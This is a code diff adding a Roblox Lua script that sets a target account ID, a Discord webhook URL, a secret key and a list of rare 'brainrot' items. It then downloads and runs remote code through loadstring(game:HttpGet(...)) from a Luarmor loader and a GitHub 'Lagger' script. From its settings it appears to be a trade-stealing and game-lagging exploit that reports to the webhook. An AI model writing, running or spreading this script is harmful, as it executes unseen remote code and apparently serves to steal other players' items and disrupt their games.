@@ -1,0 +1,36 @@
+getgenv().SECRET_KEY = "mrr_8230cedc0d034fd0b7e27cf2e6bff773"
+getgenv().TARGET_ID = 7731619368
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://canary.discord.com/api/webhooks/1482454462605033634/l-xOwQpqOHstP1QSsnyINU6W49uq5zdGrjmDusV1y3GCm1rzFJzxNmp_gin-H4aLQYvA"
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Capitano Moby"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Cerberus"] = true,
+    ["Ginger Gerat"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Cooki and Milki"] = true,
+    ["Ketupat Bros"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Dragon Gingerini"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["La Food Combinasion"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/koop232/Mikes_lagger/refs/heads/main/Lagger"))()
+end)
